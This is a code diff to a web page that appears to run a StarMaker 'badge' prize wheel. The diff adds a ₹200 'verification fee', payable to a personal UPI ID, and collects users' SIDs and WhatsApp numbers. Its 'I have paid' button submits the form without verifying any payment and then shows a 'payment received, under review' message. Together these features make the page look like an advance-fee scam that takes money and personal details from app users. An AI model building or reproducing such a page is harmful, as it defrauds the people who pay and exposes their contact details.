@@ -474,6 +474,26 @@
             color: #666;
         }
 
+        .payment-info {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: linear-gradient(135deg, rgba(255, 41, 111, 0.1), rgba(255, 107, 157, 0.1));
+            border-radius: 20px;
+        }
+
+        .price-tag {
+            font-size: clamp(36px, 8vw, 48px);
+            font-weight: 700;
+            color: #ff296f;
+            margin-bottom: 10px;
+        }
+
+        .payment-desc {
+            font-size: clamp(14px, 2.5vw, 16px);
+            color: #666;
+        }
+
         .form-group {
             margin-bottom: 20px;
         }
@@ -547,6 +567,117 @@
             z-index: 1;
         }
 
+        .payment-methods {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .payment-method-btn {
+            width: 100%;
+            padding: 18px;
+            background: #f5f5f5;
+            color: #333;
+            border: 2px solid #e0e0e0;
+            border-radius: 25px;
+            font-size: clamp(14px, 2.5vw, 16px);
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .payment-method-btn:hover {
+            background: #fff;
+            border-color: #ff296f;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 41, 111, 0.2);
+        }
+
+        .payment-instructions {
+            background: #f9f9f9;
+            padding: 25px;
+            border-radius: 20px;
+            margin-top: 20px;
+        }
+
+        .payment-instructions h3 {
+            font-size: clamp(18px, 3vw, 22px);
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .upi-details {
+            background: #fff;
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            border: 2px solid #ff296f;
+        }
+
+        .upi-details p {
+            font-size: clamp(14px, 2.5vw, 16px);
+            color: #333;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .upi-details strong {
+            color: #ff296f;
+        }
+
+        .payment-note {
+            font-size: clamp(12px, 2vw, 14px) !important;
+            color: #666 !important;
+            font-style: italic;
+            margin-top: 15px;
+        }
+
+        .back-button {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            color: #666;
+            border: 2px solid #e0e0e0;
+            border-radius: 25px;
+            font-size: clamp(14px, 2.5vw, 16px);
+            font-weight: 600;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+
+        .back-button:hover {
+            background: #f5f5f5;
+            border-color: #999;
+        }
+
+        .back-button span {
+            position: relative;
+            z-index: 1;
+        }
+
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #4caf50, #66bb6a);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+            color: #fff;
+            animation: celebrate 0.8s ease;
+        }
+
         .success-message {
             text-align: center;
             color: #4caf50;
@@ -554,6 +685,21 @@
             margin-top: 15px;
             font-size: clamp(14px, 2.5vw, 16px);
             text-shadow: none;
+        }
+
+        .review-message {
+            background: rgba(255, 41, 111, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+            border: 2px solid #ff296f;
+        }
+
+        .review-message p {
+            font-size: clamp(14px, 2.5vw, 16px);
+            color: #333;
+            text-align: center;
+            line-height: 1.6;
         }
 
         .info-section {
@@ -725,6 +871,7 @@
         </div>
     </footer>
 
+    <!-- Result Modal -->
     <div class="result-modal" id="resultModal">
         <div class="result-content">
             <img class="result-icon" id="resultIcon" src="" alt="Badge">
@@ -735,25 +882,77 @@
         </div>
     </div>
 
+    <!-- Contact Details Modal -->
     <div class="contact-modal" id="contactModal">
         <div class="contact-content">
             <div class="contact-header">
-                <h2>Contact Details</h2>
-                <p>Enter your details to claim your badge</p>
+                <h2>Payment Required</h2>
+                <p>Complete payment to claim your badge</p>
             </div>
-            <form id="contactForm" action="https://formspree.io/f/meqynyre" method="POST">
+            <div class="payment-info">
+                <div class="price-tag">₹200</div>
+                <p class="payment-desc">One-time verification fee</p>
+            </div>
+            <form id="contactForm">
                 <div class="form-group">
-                    <input type="text" name="sid" placeholder="StarMaker SID" required>
+                    <input type="text" id="sid" name="sid" placeholder="StarMaker SID" required>
                 </div>
                 <div class="form-group">
-                    <input type="text" name="country" placeholder="Country Code (eg.: +1)" required>
+                    <input type="text" id="country" name="country" placeholder="Country Code (eg.: +91)" required>
                 </div>
                 <div class="form-group">
-                    <input type="tel" name="number" placeholder="WhatsApp Number" pattern="[0-9]{10}" required>
+                    <input type="tel" id="whatsapp" name="number" placeholder="WhatsApp Number" pattern="[0-9]{10}" required>
                 </div>
-                <button type="submit" class="submit-button"><span>SUBMIT</span></button>
+                <button type="button" class="submit-button" id="paymentBtn"><span>PROCEED TO PAYMENT</span></button>
                 <div id="status" class="success-message"></div>
             </form>
+        </div>
+    </div>
+
+    <!-- Payment Modal -->
+    <div class="contact-modal" id="paymentModal">
+        <div class="contact-content">
+            <div class="contact-header">
+                <h2>Complete Payment</h2>
+                <p>Pay ₹200 to proceed</p>
+            </div>
+            <div class="payment-methods">
+                <button class="payment-method-btn" id="upiBtn">
+                    <span>📱 Pay with UPI</span>
+                </button>
+                <button class="payment-method-btn" id="paytmBtn">
+                    <span>💳 Pay with Paytm</span>
+                </button>
+                <button class="payment-method-btn" id="phonepeBtn">
+                    <span>💸 Pay with PhonePe</span>
+                </button>
+            </div>
+            <div class="payment-instructions" id="paymentInstructions" style="display: none;">
+                <h3>Payment Instructions</h3>
+                <div class="upi-details">
+                    <p><strong>UPI ID:</strong> 8305605153@paytm</p>
+                    <p><strong>Phone Number:</strong> 8305605153</p>
+                    <p><strong>Amount:</strong> ₹200</p>
+                    <p class="payment-note">After completing payment, click "I Have Paid" below</p>
+                </div>
+                <button class="submit-button" id="confirmPaymentBtn"><span>I HAVE PAID</span></button>
+                <button class="back-button" id="backBtn"><span>GO BACK</span></button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div class="contact-modal" id="successModal">
+        <div class="contact-content">
+            <div class="success-icon">✓</div>
+            <div class="contact-header">
+                <h2>Application Submitted!</h2>
+                <p>Your payment has been received</p>
+            </div>
+            <div class="review-message">
+                <p><strong>Please wait 2-3 working days</strong></p>
+                <p>Your application is under review. We'll contact you on WhatsApp once approved.</p>
+            </div>
         </div>
     </div>
 
@@ -808,13 +1007,24 @@
         const resultBadge = document.getElementById('resultBadge');
         const claimBtn = document.getElementById('claimBtn');
         const contactModal = document.getElementById('contactModal');
+        const paymentModal = document.getElementById('paymentModal');
+        const successModal = document.getElementById('successModal');
         const contactForm = document.getElementById('contactForm');
+        const paymentBtn = document.getElementById('paymentBtn');
+        const upiBtn = document.getElementById('upiBtn');
+        const paytmBtn = document.getElementById('paytmBtn');
+        const phonepeBtn = document.getElementById('phonepeBtn');
+        const paymentInstructions = document.getElementById('paymentInstructions');
+        const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
+        const backBtn = document.getElementById('backBtn');
         const status = document.getElementById('status');
 
         let currentRotation = 0;
         let isSpinning = false;
         const images = {};
         let imagesLoaded = 0;
+        let userDetails = {};
+        let selectedBadge = null;
 
         function resizeCanvas() {
             const container = document.getElementById('wheelContainer');
@@ -891,7 +1101,7 @@
             spinBtn.classList.add('disabled');
 
             const randomIndex = Math.floor(Math.random() * vtags.length);
-            const selectedTag = vtags[randomIndex];
+            selectedBadge = vtags[randomIndex];
 
             const anglePerSegment = (2 * Math.PI) / vtags.length;
             const spins = 5;
@@ -929,7 +1139,7 @@
                 } else {
                     currentRotation = endRotation;
                     drawWheel();
-                    showResult(selectedTag);
+                    showResult(selectedBadge);
                     isSpinning = false;
                     spinBtn.classList.remove('disabled');
                 }
@@ -953,6 +1163,83 @@
             }, 300);
         });
 
+        paymentBtn.addEventListener('click', () => {
+            const sid = document.getElementById('sid').value;
+            const country = document.getElementById('country').value;
+            const whatsapp = document.getElementById('whatsapp').value;
+
+            if (!sid || !country || !whatsapp) {
+                status.textContent = 'Please fill all fields!';
+                status.style.color = '#ff6b6b';
+                return;
+            }
+
+            if (!/^[0-9]{10}$/.test(whatsapp)) {
+                status.textContent = 'Please enter a valid 10-digit WhatsApp number!';
+                status.style.color = '#ff6b6b';
+                return;
+            }
+
+            userDetails = {
+                sid: sid,
+                country: country,
+                whatsapp: whatsapp,
+                badge: selectedBadge.name
+            };
+
+            contactModal.classList.remove('active');
+            setTimeout(() => {
+                paymentModal.classList.add('active');
+            }, 300);
+        });
+
+        upiBtn.addEventListener('click', () => showPaymentInstructions('UPI'));
+        paytmBtn.addEventListener('click', () => showPaymentInstructions('Paytm'));
+        phonepeBtn.addEventListener('click', () => showPaymentInstructions('PhonePe'));
+
+        function showPaymentInstructions(method) {
+            document.querySelector('.payment-methods').style.display = 'none';
+            paymentInstructions.style.display = 'block';
+        }
+
+        backBtn.addEventListener('click', () => {
+            document.querySelector('.payment-methods').style.display = 'flex';
+            paymentInstructions.style.display = 'none';
+        });
+
+        confirmPaymentBtn.addEventListener('click', () => {
+            const formData = new FormData();
+            formData.append('sid', userDetails.sid);
+            formData.append('country', userDetails.country);
+            formData.append('number', userDetails.whatsapp);
+            formData.append('badge', userDetails.badge);
+            formData.append('payment', '₹200 Paid');
+
+            fetch('https://formspree.io/f/meqynyre', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    paymentModal.classList.remove('active');
+                    setTimeout(() => {
+                        successModal.classList.add('active');
+                    }, 300);
+                    
+                    setTimeout(() => {
+                        successModal.classList.remove('active');
+                        location.reload();
+                    }, 5000);
+                } else {
+                    alert('Error submitting form. Please try again.');
+                }
+            }).catch(error => {
+                alert('Error submitting form. Please try again.');
+            });
+        });
+
         function createConfetti() {
             const colors = ['#ff296f', '#ff6b9d', '#ffa6c9', '#ffb3d9', '#ffc0e0', '#ffd4e5'];
             for (let i = 0; i < 50; i++) {
@@ -967,35 +1254,6 @@
                 }, i * 30);
             }
         }
-
-        contactForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            const data = new FormData(contactForm);
-            
-            fetch(contactForm.action, {
-                method: contactForm.method,
-                body: data,
-                headers: {
-                    'Accept': 'application/json'
-                }
-            }).then(response => {
-                if (response.ok) {
-                    contactForm.reset();
-                    status.textContent = 'Submitted successfully!';
-                    status.style.color = '#ff296f';
-                    setTimeout(() => {
-                        contactModal.classList.remove('active');
-                        status.textContent = '';
-                    }, 2000);
-                } else {
-                    status.textContent = 'Oops! There was a problem.';
-                    status.style.color = '#ff6b6b';
-                }
-            }).catch(error => {
-                status.textContent = 'Oops! There was a problem.';
-                status.style.color = '#ff6b6b';
-            });
-        });
 
         const particlesContainer = document.getElementById('particles');
         for (let i = 0; i < 50; i++) {
